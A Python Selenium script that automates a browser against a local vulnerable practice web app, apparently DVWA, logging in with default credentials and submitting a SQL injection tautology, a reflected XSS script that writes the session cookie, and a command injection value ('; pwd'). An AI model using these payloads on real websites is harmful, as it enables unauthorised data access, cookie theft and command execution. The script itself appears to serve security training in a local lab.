import os
import subprocess
from selenium import webdriver
from time import sleep
from selenium.webdriver.common.keys import Keys


def automation():
    """gecko_driver_path = subprocess.Popen(["realpath", "geckodriver"], stdout=subprocess.PIPE).communicate()[0].decode()[:-1]
    gecko_driver_path = gecko_driver_path[:gecko_driver_path.find("geckodriver")]
    os.environ["PATH"] = "$PATH:" + gecko_driver_path"""
    driver = webdriver.Firefox()
    driver.get("http://localhost:7891/login.php")
    login = driver.find_elements_by_xpath("//input[@name='Login' and @value='Login']")[0]
    login.click()
    create_db_button = driver.find_elements_by_xpath("//input[@name='create_db' and @value='Create / Reset Database']")[0]
    create_db_button.click()
    sleep(8)
    driver.find_element_by_name("username").send_keys("admin")
    driver.find_element_by_name("password").send_keys("password")
    login_button = driver.find_elements_by_xpath("//input[@name='Login' and @value='Login']")[0]
    login_button.click()
    driver.find_element_by_link_text("SQL Injection").click()
    driver.find_element_by_name("id").send_keys("' or '1' = '1")
    sleep(3)
    sql_injection_button = driver.find_elements_by_xpath("//input[@name='Submit' and @value='Submit']")[0]
    sql_injection_button.click()
    sleep(3)
    driver.find_element_by_link_text("XSS (Reflected)").click()
    driver.find_element_by_name("name").send_keys("<script>document.write(document.cookie)</script>")
    sleep(3)
    xss_button = driver.find_elements_by_xpath("//input[@value='Submit']")[0]
    xss_button.click()
    sleep(3)
    driver.find_element_by_link_text("Command Injection").click()
    driver.find_element_by_name("ip").send_keys("; pwd")
    sleep(3)
    xss_button = driver.find_elements_by_xpath("//input[@name='Submit' and @value='Submit']")[0]
    xss_button.click()
    sleep(3)


def main():
    #install_fire_fox_path = subprocess.Popen(["which", "firefox"], stdout=subprocess.PIPE).communicate()[0].decode()[:-1]
    #install_fire_fox_path = install_fire_fox_path[:install_fire_fox_path.find("firefox")]
    automation()


if __name__ == "__main__":
    main()

    """
    driver = webdriver.Firefox()
    driver.get("http://www.python.org")
    assert "Python" in driver.title
    elem = driver.find_element_by_name("q")
    elem.clear()
    elem.send_keys("pycon")
    elem.send_keys(Keys.RETURN)
    assert "No results found." not in driver.page_source
    input("hey")
    driver.close()"""
